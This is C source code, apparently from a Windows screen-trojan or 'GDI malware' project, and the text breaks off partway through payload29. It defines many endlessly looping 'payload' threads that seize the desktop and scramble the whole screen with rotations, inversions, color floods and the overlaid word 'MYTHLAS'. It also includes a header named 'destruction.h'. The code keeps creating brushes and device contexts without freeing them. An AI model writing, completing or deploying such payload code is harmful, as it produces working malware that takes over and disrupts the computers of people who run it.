#include "main.h"
#include "sounds.h"
#include "destruction.h"
DWORD WINAPI payload1(LPVOID lpParam) {
	HDC desk = GetDC(0);
	POINT wPt[3];
	RECT wRect;
	while (1) {
		desk = GetDC(0);
		SeedXorshift32(__rdtsc());
		int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
		GetWindowRect(GetDesktopWindow(), &wRect);
		if (xorshift32() % 2 == 0) {
			wPt[0].x = wRect.left - 30;
			wPt[0].y = wRect.top - 30;
			wPt[1].x = wRect.right + 30;
			wPt[1].y = wRect.top;
			wPt[2].x = wRect.left - 30;
			wPt[2].y = wRect.bottom + 30;
			PlgBlt(desk, wPt, desk, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
		}
		else if (xorshift32() % 2 == 1) {
			wPt[0].x = wRect.left + 30;
			wPt[0].y = wRect.top + 30;
			wPt[1].x = wRect.right - 30;
			wPt[1].y = wRect.top;
			wPt[2].x = wRect.left + 30;
			wPt[2].y = wRect.bottom - 30;
			PlgBlt(desk, wPt, desk, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
		}
		Sleep(xorshift32() % 30);
		if (xorshift32() % 10 == 5) InvalidateRect(0, 0, 0);
	}
}
DWORD WINAPI payload2(LPVOID lpParam) {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	while (1) {
		desk = GetDC(0);
		SeedXorshift32(__rdtsc());
		SetBkColor(desk, CUSRGB(xorshift32() % 255, xorshift32() % 255, xorshift32() % 255));
		TextOutW(desk, xorshift32() % sw, xorshift32() % sh, L"                        ", wcslen(L"                        "));
		BitBlt(desk, xorshift32() % 10, xorshift32() % 10, sw, sh, desk, xorshift32() % 10, xorshift32() % 10, SRCCOPY);
		Sleep(1);
	}
}
DWORD WINAPI payload3(LPVOID lpParam) {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	int rx;
	for (int i = 0;; i++, i %= 30) {
		SeedXorshift32(__rdtsc());
		desk = GetDC(0);
		rx = xorshift32() % sw;
		int ry = xorshift32() % sh;
		SelectObject(desk, CreateSolidBrush(RGB(xorshift32() % 255, xorshift32() % 255, xorshift32() % 255)));
		BitBlt(desk, rx, 10, 100, sh, desk, rx, 1, SRCCOPY);		BitBlt(desk, rx, 10, 100, sh, desk, rx, 1, 0x2837E28);
		BitBlt(desk, rx, -10, -100, sh, desk, rx, 1, SRCCOPY);		BitBlt(desk, rx, -10, -100, sh, desk, rx, 1, 0x2837E28);
		BitBlt(desk, 10, ry, sw, 96, desk, 1, ry, SRCCOPY);		BitBlt(desk, 10, ry, sw, 96, desk, 1, ry, 0x2837E28);
		BitBlt(desk, -10, ry, sw, -96, desk, 1, ry, SRCCOPY);		BitBlt(desk, -10, ry, sw, -96, desk, 1, ry, 0x2837E28);
		Sleep(10);
		if (!i) InvalidateRect(0, 0, 0);
	}
}
DWORD WINAPI payload4(LPVOID lpParam) {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	while (1) {
		SeedXorshift32(__rdtsc());
		desk = GetDC(0);
		SelectObject(desk, CreateHatchBrush(xorshift32() % 7, RGB(xorshift32() % 255, xorshift32() % 255, xorshift32() % 255)));
		Ellipse(desk, xorshift32() % sw, xorshift32() % sh, xorshift32() % sw, xorshift32() % sh);
		Rectangle(desk, xorshift32() % sw, xorshift32() % sh, xorshift32() % sw, xorshift32() % sh);
		BitBlt(desk, xorshift32() % 10, xorshift32() % 10, sw, sh, desk, xorshift32() % 10, xorshift32() % 10, 0x2837E28);
		Sleep(20);
		if (xorshift32() % 35 == 5) InvalidateRect(0, 0, 0);
	}
}
DWORD WINAPI payload5(LPVOID lpParam) {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	while (1) {
		SeedXorshift32(__rdtsc());
		desk = GetDC(0);
		int radius = 100;
		for (int i = 4; i < sw / 2; i += 3) {
			desk = GetDC(0);
			SelectObject(desk, CreateSolidBrush(RGB(xorshift32() % 255, xorshift32() % 255, xorshift32() % 255)));
			int x = (float)(radius * sin(i * 3 / 180)), y = (int)(radius * cos(i * 3 / 180));
			BitBlt(desk, x, y, sw, sh, desk, 0, 0, 0x2837E28);
			BitBlt(desk, y, x, sw, sh, desk, 0, 0, SRCBSH); Sleep(30);
		}
	}
}
DWORD WINAPI payload6(LPVOID lpParam) {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	while (1) {
		SeedXorshift32(__rdtsc());
		desk = GetDC(0);
		StretchBlt(desk, 0, 0, sw, sh, desk, xorshift32() % sw, xorshift32() % sh, sw, sh, SRCCOPY);StretchBlt(desk, 0, 0, sw, sh, desk, xorshift32() % sw, 0 - xorshift32() % sh, sw, sh, SRCCOPY);StretchBlt(desk, 0, 0, sw, sh, desk, 0 - xorshift32() % sw, xorshift32() % sh, sw, sh, SRCCOPY);StretchBlt(desk, 0, 0, sw, sh, desk, 0 - xorshift32() % sw, 0 - xorshift32() % sh, sw, sh, SRCCOPY);StretchBlt(desk, 0, 0, sw, sh, desk, sw, sh, -sw, -sh, SRCCOPY);
		if (((xorshift32() % 10 == 5))) InvalidateRect(0, 0, 0);
		Sleep(xorshift32() % 100);
	}
}
VOID WINAPI mlt() {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	int rx;
	desk = GetDC(0);
	rx = xorshift32() % sw;
	int ry = xorshift32() % sh;
	BitBlt(desk, rx, 20, 200, sh, desk, rx, 0, SRCCOPY);BitBlt(desk, rx, -20, -200, sh, desk, rx, 0, SRCCOPY);
	BitBlt(desk, 20, ry, sw, 150, desk, 0, ry, SRCCOPY);BitBlt(desk, -20, ry, sw, -150, desk, 0, ry, SRCCOPY);
	Sleep(10);
}
DWORD WINAPI payload7(LPVOID lpParam) {
	while (1) {
		SeedXorshift32(__rdtsc());
		int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
		HDC desk = GetDC(0);
		mlt();
	}
}
DWORD WINAPI payload8(LPVOID lpParam) {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	double moveangle = 0;
	while (1) {
		SeedXorshift32(__rdtsc());
		desk = GetDC(0);
		SelectObject(desk, CreateSolidBrush(RGB(xorshift32() % 255, xorshift32() % 255, xorshift32() % 255)));
		int ax = (int)(cos(moveangle) * 5.0);
		int ay = (int)(sin(moveangle) * 5.0);
		int w = xorshift32() % sh, h = sh / 2 - xorshift32() % sh / 3;
		BitBlt(desk, 0, w, sw, h, desk, 0 + xorshift32() % 21 - 10, w, SRCPAINT ^ PATCOPY);
		BitBlt(desk, ax, ay, sw, sh, desk, 0, 0, SRCCOPY);
		moveangle = fmod(moveangle + M_PI / 16.f, M_PI * 2.f);
		if (((xorshift32() % 4 == 1))) InvalidateRect(0, 0, 0);
		Sleep(xorshift32() % 100);
	}
}
DWORD WINAPI payload9(LPVOID lpParam) {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	POINT wPt[3];
	RECT wRect;
	while (1) {
		desk = GetDC(0);
		SeedXorshift32(__rdtsc());
		GetWindowRect(GetDesktopWindow(), &wRect);
		int x = xorshift32() % 1000;
		wPt[0].x = wRect.left - xorshift32() % 1010 + 500;wPt[0].y = wRect.left - xorshift32() % 2001 + 1000;wPt[1].x = wRect.left - xorshift32() % 2001 + 1000;wPt[1].y = wRect.left + xorshift32() % 4100 + 2000;wPt[2].x = wRect.left + x - xorshift32() % 2100 + 1000;wPt[2].y = wRect.left + x - xorshift32() % 2010 + 1000;
		PlgBlt(desk, wPt, desk, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
		StretchBlt(desk, 0, 0, sw, sh, desk, xorshift32() % sw, xorshift32() % sh, sw, sh, SRCCOPY);StretchBlt(desk, 0, 0, sw, sh, desk, xorshift32() % sw, 0 - xorshift32() % sh, sw, sh, SRCCOPY);StretchBlt(desk, 0, 0, sw, sh, desk, 0 - xorshift32() % sw, xorshift32() % sh, sw, sh, SRCCOPY);StretchBlt(desk, 0, 0, sw, sh, desk, 0 - xorshift32() % sw, 0 - xorshift32() % sh, sw, sh, SRCCOPY);
		StretchBlt(desk, 0, xorshift32() % sh, sw, xorshift32() % sh, desk, xorshift32() % sw, xorshift32() % sh, 1, 1, SRCINVERT);StretchBlt(desk, 0, 0, sw, sh, desk, xorshift32() % sw, xorshift32() % sh, 1, 1, SRCINVERT);
	}
}
RECT wRect;
POINT wPt[3];
void rotateScreen1(int counter) {
	SeedXorshift32(__rdtsc());
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	HDC deskMem = CreateCompatibleDC(desk);
	HBITMAP screenshot = CreateCompatibleBitmap(desk, sw, sh);
	SelectObject(deskMem, screenshot);
	GetWindowRect(GetDesktopWindow(), &wRect);
	wPt[0].x = wRect.left + counter;
	wPt[0].y = wRect.top - counter;
	wPt[1].x = wRect.right + counter;
	wPt[1].y = wRect.top + counter;
	wPt[2].x = wRect.left - counter;
	wPt[2].y = wRect.bottom - counter;
	PlgBlt(deskMem, wPt, desk, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
	SelectObject(desk, CreateSolidBrush(RGB(xorshift32() % 255, xorshift32() % 255, xorshift32() % 255)));
	BitBlt(desk, 0, 0, sw, sh, deskMem, 0, 0, !(xorshift32() % 2) ? SRCPAINT : SRCAND);
	Sleep(10);		if (xorshift32() % 20 == 5) InvalidateRect(0, 0, 0);
}
void rotateScreen2(int counter) {
	SeedXorshift32(__rdtsc());
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	HDC deskMem = CreateCompatibleDC(desk);
	HBITMAP screenshot = CreateCompatibleBitmap(desk, sw, sh);
	SelectObject(deskMem, screenshot);
	GetWindowRect(GetDesktopWindow(), &wRect);
	wPt[0].x = wRect.left - counter;
	wPt[0].y = wRect.top + counter;
	wPt[1].x = wRect.right - counter;
	wPt[1].y = wRect.top - counter;
	wPt[2].x = wRect.left + counter;
	wPt[2].y = wRect.bottom + counter;
	PlgBlt(deskMem, wPt, desk, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
	SelectObject(desk, CreateSolidBrush(RGB(xorshift32() % 255, xorshift32() % 255, xorshift32() % 255)));
	BitBlt(desk, 0, 0, sw, sh, deskMem, 0, 0, !(xorshift32() % 2) ? SRCPAINT : SRCAND);
	Sleep(10);		if (xorshift32() % 20 == 5) InvalidateRect(0, 0, 0);
}
DWORD WINAPI payload10(LPVOID lpParam) {
	while (1) {
		rotateScreen1(10);
		rotateScreen2(10);
		rotateScreen2(10);
		rotateScreen1(10);
	}
}
DWORD WINAPI payload10dot2(LPVOID lpParam) {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	while (1) {
		SeedXorshift32(__rdtsc());
		desk = GetDC(0);
		SelectObject(desk, CreateSolidBrush(RGB(xorshift32() % 75, xorshift32() % 75, xorshift32() % 75)));
		PatBlt(desk, 0, 0, sw, sh, PATINVERT);
		Sleep(xorshift32() % 250);
	}
}
DWORD WINAPI payload11(LPVOID lpParam) {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	double moveangle = 0;
	while (1) {
		desk = GetDC(0);
		SeedXorshift32(__rdtsc());
		BitBlt(desk, xorshift32() % 30, xorshift32() % 30, sw, sh, desk, xorshift32() % 30, xorshift32() % 30, SRCCOPY);
		int x = (int)(tan(moveangle) * 400.0);
		int y = (int)(sin(moveangle) * 400.0);
		BitBlt(desk, x, y, sw, sh, desk, 0, 0, SRCCOPY);
		moveangle = fmod(moveangle + M_PI / 16.f, M_PI * 2.f);
		Sleep(10);
	}
}
DWORD WINAPI payload12(LPVOID lpParam) {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
	while (1) {
		SeedXorshift32(__rdtsc());
		desk = GetDC(0);
		int y = xorshift32() % sh;
		BitBlt(desk, 10, y, sw, 96, desk, 0, y, !(xorshift32() % 2) ? SRCERASE : SRCPAINT);
		BitBlt(desk, -10, y, sw, -96, desk, 0, y, !(xorshift32() % 2) ? SRCERASE : SRCPAINT);
		Sleep(xorshift32() % 5);
	}
}
VOID WINAPI CircleInvert(int x, int y, int w, int h) {
	HWND hwnd = NULL;
	HDC hdc = GetDC(hwnd);
	HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
	SelectClipRgn(hdc, hrgn);
	BitBlt(hdc, x, y, w, h, hdc, x, y, NOTSRCCOPY);
	DeleteObject(hrgn);
	ReleaseDC(hwnd, hdc);
}

DWORD WINAPI payload13(LPVOID lpParam) {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
	while (1) {
		SeedXorshift32(__rdtsc());
		desk = GetDC(0);
		BitBlt(desk, xorshift32() % 100, xorshift32() % 100, sw, sh, desk, xorshift32() % 100, xorshift32() % 100, SRCCOPY);
		BitBlt(desk, xorshift32() % 3, xorshift32() % 3, sw, sh, desk, xorshift32() % 3, xorshift32() % 3, SRCPAINT);
		SelectObject(desk, CreateSolidBrush(RGB(xorshift32() % 75, xorshift32() % 75, xorshift32() % 75)));
		BitBlt(desk, 0, 0, sw, sh, desk, 0, 0, PATINVERT);
		RECT rect;
		GetWindowRect(GetDesktopWindow(), &rect);
		int w = rect.right - rect.top - 500, h = rect.bottom - rect.top - 500;
		const int size = 1000;
		int x = xorshift32() % (w + size) - size / 2, y = xorshift32() % (h + size) - size / 2;
		for (int i = 0; i < size; i += 100) {
			CircleInvert(x - i / 2, y - i / 2, i, i);
		}
		Sleep(25);
	}
}
VOID WINAPI zer1() {
	SeedXorshift32(__rdtsc());
	HDC desk = GetDC(0);
	RECT wRect;
	POINT wPt[3];
	desk = GetDC(0);
	GetWindowRect(GetDesktopWindow(), &wRect);
	int c = 100;
	wPt[0].x = wRect.left + xorshift32() % 110 - 50;
	wPt[0].y = wRect.top + xorshift32() % 210 - 100;
	wPt[1].x = wRect.right + xorshift32() % 210 - 100;
	wPt[1].y = wRect.top + xorshift32() % 410 - 200;
	wPt[2].x = wRect.left + c - xorshift32() % 210 - c;
	wPt[2].y = wRect.bottom - c + xorshift32() % 210 - c;
	PlgBlt(desk, wPt, desk, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
	Sleep(40);
	if (xorshift32() % 5 == 1) RedrawWindow(0, 0, 0, 133);
}
VOID WINAPI zer2() {
	SeedXorshift32(__rdtsc());
	HDC desk = GetDC(0);
	RECT wRect;
	POINT wPt[3];
	desk = GetDC(0);
	GetWindowRect(GetDesktopWindow(), &wRect);
	int c = 100;
	wPt[0].x = wRect.left - xorshift32() % 110 + 50;
	wPt[0].y = wRect.top - xorshift32() % 210 + 100;
	wPt[1].x = wRect.right - xorshift32() % 210 + 100;
	wPt[1].y = wRect.top - xorshift32() % 410 + 200;
	wPt[2].x = wRect.left - c + xorshift32() % 210 + c;
	wPt[2].y = wRect.bottom + c - xorshift32() % 210 + c;
	PlgBlt(desk, wPt, desk, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
	Sleep(20);
	if (xorshift32() % 5 == 1) RedrawWindow(0, 0, 0, 133);
}
DWORD WINAPI payload14(LPVOID lpParam) {
	while (1) {
		zer1();
		zer2();
		zer2();
		zer1();

	}
}
DWORD WINAPI payload15(LPVOID lpParam) {
	while (1) {
		HDC dc = GetDC(0);
		INT ix = GetSystemMetrics(0);
		INT iy = GetSystemMetrics(1);
		SeedXorshift32(__rdtsc());
		if (xorshift32() % 4 == 0) {
			BitBlt(dc, xorshift32() % 1 - 1, xorshift32() % 1 - 1, ix, iy, dc, 1, 1, SRCCOPY);
		}
		else if (xorshift32() % 4 == 1) {
			BitBlt(dc, xorshift32() % 1 + 1, xorshift32() % 1 + 1, ix, iy, dc, -1, -1, SRCCOPY);
		}
		else if (xorshift32() % 4 == 2) {
			SelectObject(dc, CreateSolidBrush(RGB(xorshift32() % 255, xorshift32() % 255, xorshift32() % 255)));
			BitBlt(dc, xorshift32() % 1 - 1, xorshift32() % 1 - 1, ix, iy, dc, 1, 1, 0x2837E28);
		}
		else if (xorshift32() % 4 == 3) {
			SelectObject(dc, CreateSolidBrush(RGB(xorshift32() % 255, xorshift32() % 255, xorshift32() % 255)));
			BitBlt(dc, xorshift32() % 1 + 1, xorshift32() % 1 + 1, ix, iy, dc, -1, -1, 0x2837E28);
		}
		Sleep(10);
	}
}

DWORD WINAPI payload16(LPVOID lpParam) {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	while (1) {
		desk = GetDC(0);
		SeedXorshift32(__rdtsc());
		SetBkMode(desk, TRANSPARENT);
		SetTextColor(desk, CUSRGB(xorshift32() % 255, xorshift32() % 255, xorshift32() % 255));
		TextOutW(desk, xorshift32() % sw, xorshift32() % sh, L"MYTHLAS", wcslen(L"MYTHLAS"));
		SelectObject(desk, CreateSolidBrush(RGB(xorshift32() % 75, xorshift32() % 75, xorshift32() % 75)));
		BitBlt(desk, 0, 0, sw, sh, desk, 0, 0, PATINVERT);
		BitBlt(desk, xorshift32() % 20, xorshift32() % 20, sw, sh, desk, xorshift32() % 20, xorshift32() % 20, SRCCOPY);
		StretchBlt(desk, 10, 10, sw - 20, sh - 20, desk, 0, 0, sw, sh, SRCCOPY);
		GetWindowRect(GetDesktopWindow(), &wRect);
		wPt[0].x = wRect.left - 10;
		wPt[0].y = wRect.top + 10;
		wPt[1].x = wRect.right - 10;
		wPt[1].y = wRect.top - 10;
		wPt[2].x = wRect.left + 10;
		wPt[2].y = wRect.bottom + 10;
		PlgBlt(desk, wPt, desk, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
		if (xorshift32() % 7 == 0) InvalidateRect(0, 0, 0);
	}
}
DWORD WINAPI payload17(LPVOID lpParam) {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
	int rx;
	double moveangle = 0;
	while (true) {
		desk = GetDC(0);
		SeedXorshift32(__rdtsc());
		rx = xorshift32() % sw;
		int ry = xorshift32() % sh;
		StretchBlt(desk, 0, 0, sw, sh, desk, rx, ry, 100, 100, SRCINVERT);
		Sleep(50);
		if (xorshift32() % 5 == 3) InvalidateRect(0, 0, 0);
		int ax = (int)(cos(moveangle) * 3.0);
		int ay = (int)(sin(moveangle) * 3.0);
		BitBlt(desk, ax, ay, sw, sh, desk, 0, 0, SRCCOPY);
		moveangle = fmod(moveangle + M_PI / 16.f, M_PI * 2.f);
	}
}
DWORD WINAPI payload18(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	INT ix = GetSystemMetrics(0);
	INT iy = GetSystemMetrics(1);
	CURSORINFO curinf;
	while (1) {
		SeedXorshift32(__rdtsc());
		hdc = GetDC(0);
		SelectObject(hdc, CreateSolidBrush(RGB(xorshift32() % 255, xorshift32() % 255, xorshift32() % 255)));
		BitBlt(hdc, xorshift32() % 1 - 1, xorshift32() % 1 - 1, ix, iy, hdc, 1, 1, SRCBSH);
		BitBlt(hdc, xorshift32() % 1 + 1, xorshift32() % 1 + 1, ix, iy, hdc, -1, -1, SRCBSH);
		BitBlt(hdc, xorshift32() % 21 - 10, xorshift32() % 21 - 10, ix, iy, hdc, 0, 0, SRCCOPY);
		GetCursorInfo(&curinf);
		curinf.cbSize = sizeof(curinf);
		DrawIcon(hdc, xorshift32() % ix, xorshift32() % iy, curinf.hCursor);
		Sleep(5);
	}
}
DWORD WINAPI payload19(LPVOID lpParam) {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	while (1) {
		desk = GetDC(0);
		SeedXorshift32(__rdtsc());
		StretchBlt(desk, 0, 0, sw, sh, desk, xorshift32() % sw, xorshift32() % sh, sw, sh, !(xorshift32() % 2) ? SRCAND : SRCPAINT);
		StretchBlt(desk, 0, 0, sw, sh, desk, xorshift32() % sw, 0-xorshift32() % sh, sw, sh, !(xorshift32() % 2) ? SRCAND : SRCPAINT);
		StretchBlt(desk, 0, 0, sw, sh, desk, 0-xorshift32() % sw, xorshift32() % sh, sw, sh, !(xorshift32() % 2) ? SRCAND : SRCPAINT);
		StretchBlt(desk, 0, 0, sw, sh, desk, 0-xorshift32() % sw, 0-xorshift32() % sh, sw, sh, !(xorshift32() % 2) ? SRCAND : SRCPAINT);
		Sleep(10);
		if (xorshift32() % 6 == 5) InvalidateRect(0, 0, 0);
	}
}
DWORD WINAPI payload20(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	INT ix = GetSystemMetrics(0);
	INT iy = GetSystemMetrics(1);
	while (1) {
		hdc = GetDC(0);
		SeedXorshift32(__rdtsc());
		BitBlt(hdc, xorshift32() % 100, xorshift32() % 100, ix, iy, hdc, xorshift32() % 100, xorshift32() % 100, !(xorshift32() % 2) ? SRCERASE : SRCPAINT);
		Sleep(10);
	}
}
DWORD WINAPI payload21(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	INT ix = GetSystemMetrics(0);
	INT iy = GetSystemMetrics(1);
	int xs = GetSystemMetrics(0), ys = GetSystemMetrics(1);
	while (1) {
		SeedXorshift32(__rdtsc());
		hdc = GetDC(0);
		SelectObject(hdc, CreateSolidBrush(RGB(xorshift32() % 255, xorshift32() % 255, xorshift32() % 255)));
		BitBlt(hdc, xorshift32() % 10, xorshift32() % 10, xs, ys, hdc, xorshift32() % 10, xorshift32() % 10, 0x32032c);
	}
}
DWORD WINAPI payload22(LPVOID lpParam) {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	double moveangle = 0;
	while (1) {
		desk = GetDC(0);
		SeedXorshift32(__rdtsc());
		int ax = (int)(cos(moveangle) * 5);
		SelectObject(desk, CreateSolidBrush(RGB(xorshift32() % 255, xorshift32() % 255, xorshift32() % 255)));
		int ay = (int)(sin(moveangle) * 5);
		StretchBlt(desk, ax, ay, sw, sh, desk, 10, 10, sw - 20, sh - 20, RGBBRUSH);
		moveangle = fmod(moveangle + M_PI / 16.f, M_PI * 2.f);
		Sleep(10);
	}
}

DWORD WINAPI payload23(LPVOID lpParam) {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	while (1) {
		SeedXorshift32(__rdtsc());
		desk = GetDC(0);
		int w = xorshift32() % sh, h = sh / 2 - xorshift32() % sh / 3;
		BitBlt(desk, 0, w, sw, h, desk, 0 + xorshift32() % 21 - 10, w, SRCCOPY);
		BitBlt(desk, 0, w, sw, h, desk, 0 - xorshift32() % 21 + 10, w, SRCCOPY);
		if (((xorshift32() % 10 == 1))) InvalidateRect(0, 0, 0);
		Sleep(3);
	}
}
DWORD WINAPI payload24(LPVOID lpParam) {
	int sh = GetSystemMetrics(0), sw = GetSystemMetrics(1);
	double moveangle = 0; CURSORINFO curinf;
	for (int i = 0;; i++, i %= 20) {
		GetCursorInfo(&curinf);
		SeedXorshift32(__rdtsc());
		HDC desk = GetDC(0);
		int ax = (int)(fabsf(moveangle) * 3);
		int ay = (int)(tan(moveangle) * 3);
		SelectObject(desk, CreateSolidBrush(RGB(xorshift32() % 255, xorshift32() % 255, xorshift32() % 255)));
		BitBlt(desk, ax, ay, sh, sw, desk, 0, 0, SRCBSH);
		BitBlt(desk, ay, ax, sh, sw, desk, 0, 0, SRCBSH);
		BitBlt(desk, -ax, -ay, sh, sw, desk, 0, 0, SRCBSH);
		BitBlt(desk, -ay, -ax, sh, sw, desk, 0, 0, SRCBSH);
		curinf.cbSize = sizeof(curinf);
		DrawIcon(desk, xorshift32() % sw, xorshift32() % sh, curinf.hCursor);
		moveangle = fmod(moveangle + M_PI / 16.f, M_PI * 2.f);
		Sleep(10);
	}
}
DWORD WINAPI payload25(LPVOID lpParam) {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	double moveangle = 0;
	for (int i = 0;; i++, i %= 40) {
		desk = GetDC(0);
		int ax = (int)(cos(moveangle) * 30);
		int ay = (int)(sin(moveangle) * 30);
		SelectObject(desk, CreateSolidBrush(RGB(xorshift32() % 255, xorshift32() % 255, xorshift32() % 255)));
		BitBlt(desk, ax, ay, sw, sh, desk, 0, 0, SRCCOPY);
		if (xorshift32() % 10 == 3) {
			StretchBlt(desk, 10, 10, sw - 20, sh - 20, desk, 0, 0, sw, sh, SRCPAINT);
			StretchBlt(desk, -10, -10, sw + 20, sh + 20, desk, 0, 0, sw, sh, SRCPAINT);
		}
		else if (xorshift32() % 10 == 4) {
			StretchBlt(desk, 20, 20, sw - 30, sh - 30, desk, 0, 0, sw, sh, SRCCOPY);
		}
		SelectObject(desk, CreateSolidBrush(RGB(xorshift32() % 15, xorshift32() % 15, xorshift32() % 15)));
		PatBlt(desk, 0, 0, sw, sh, PATINVERT);
		Sleep(5);
		if (!i) InvalidateRect(0, 0, 0);
	}
}

DWORD WINAPI payload26(LPVOID lpParam) {
	int ix = GetSystemMetrics(0), iy = GetSystemMetrics(1);
	double moveangle = 0;
	while (true) {
		SeedXorshift32(__rdtsc());
		int ax = (int)(cos(moveangle) * 50.0);
		int ay = (int)(sin(moveangle) * 50.0);
		RedrawWindow(0, 0, 0, 133);
		BITMAPINFO bmInfo;
		bmInfo.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
		bmInfo.bmiHeader.biWidth = xorshift32() % ix;
		bmInfo.bmiHeader.biHeight = xorshift32() % iy;
		bmInfo.bmiHeader.biPlanes = xorshift32() % 100;
		bmInfo.bmiHeader.biBitCount = xorshift32() % 25;
		bmInfo.bmiColors->rgbRed = xorshift32() % 255;
		bmInfo.bmiColors->rgbGreen = xorshift32() % 255;
		bmInfo.bmiColors->rgbBlue = xorshift32() % 255;
		LPBYTE* pbytes;

		HDC dc = GetDC(0); HDC dcMem = CreateCompatibleDC(dc);
		HBITMAP bm = CreateDIBSection(dc, &bmInfo, DIB_RGB_COLORS, (VOID**)&pbytes, NULL, 0);
		SelectObject(dcMem, bm);
		BitBlt(dcMem, 0, 0, ix, iy, dc, 0, 0, PATINVERT);

		HBRUSH brush = CreateSolidBrush(RGB(xorshift32() % 255, xorshift32() % 255, xorshift32() % 255));
		SelectObject(dc, brush);
		int w = xorshift32() % ix;
		int h = xorshift32() % iy;
		int w2 = xorshift32() % ix;
		int h2 = xorshift32() % iy;
		for (int i = 5; i < 16; i++) {
			Sleep(20);
			HRGN rgn = CreateEllipticRgn(h - h * i, w + w + i, h + 1000 - i, w - 9000 / i);
			HRGN rgn2 = CreateRectRgn(h2 - w2 / i, w2 + h2 + i, w2 + 1000 * i, h2 - 9000 - i);
			InvertRgn(dc, rgn);
			InvertRgn(dc, rgn2);
			StretchBlt(dc, 0, 0, ix, iy, dc, 0, 0, ix, iy, PATINVERT);
			BitBlt(dc, ax, ay, ix, iy, dc, 0, 0, NOTSRCCOPY);
			BitBlt(dc, ay, ax, ix, iy, dc, 0, 0, SRCPAINT);
			moveangle = fmod(moveangle + M_PI / 16.f, M_PI * 2.f);
		}
		DeleteObject(dc); DeleteObject(dcMem); DeleteObject(bm);
	}
}

DWORD WINAPI payload27(LPVOID lpParam) {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
	double moveangle = 0;
	while (true) {
		desk = GetDC(0);
		SeedXorshift32(__rdtsc());
		int ax = (int)(cos(moveangle) * 30.0);
		int ay = (int)(sin(moveangle) * 30.0);
		SelectObject(desk, CreateSolidBrush(RGB(xorshift32() % 255, xorshift32() % 255, xorshift32() % 255)));
		BitBlt(desk, ax, ay, sw, sh, desk, 0, 0, RGBBRUSH);
		int w = xorshift32() % sh, h = sh / 2 - xorshift32() % sh / 3;
		BitBlt(desk, 0, w, sw, h, desk, 0 + xorshift32() % 210 - 100, w, SRCCOPY ^ PATCOPY);
		if (((xorshift32() % 10 == 1))) InvalidateRect(0, 0, 0);
		moveangle = fmod(moveangle + M_PI / 16.f, M_PI * 2.f);
		Sleep(xorshift32() % 20);
	}
}
DWORD WINAPI RedrawCounter(LPVOID lpRedraw) {
	while (1) {
		Sleep(500);
		InvalidateRect(0, 0, 0);
	}
}
DWORD WINAPI payload28(LPVOID lpParam) {
	CreateThread(0, 0, RedrawCounter, 0, 0, 0);
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	int rx;
	for (int i = 0;; i++) {
		SeedXorshift32(__rdtsc());
		desk = GetDC(0);
		rx = xorshift32() % sw;
		int ry = xorshift32() % sh;
		SelectObject(desk, CreateSolidBrush(RGB(xorshift32() % 255, xorshift32() % 255, xorshift32() % 255)));
		BitBlt(desk, rx, 10, 100, sh, desk, rx, 0, RGBBRUSH);
		BitBlt(desk, rx, -10, -100, sh, desk, rx, 0, RGBBRUSH);
		BitBlt(desk, 10, ry, sw, 96, desk, 0, ry, RGBBRUSH);
		BitBlt(desk, -10, ry, sw, -96, desk, 0, ry, RGBBRUSH);
		Sleep(1);
	}
}
DWORD WINAPI payload29(LPVOID lpParam) {
	HDC desk = GetDC(0);
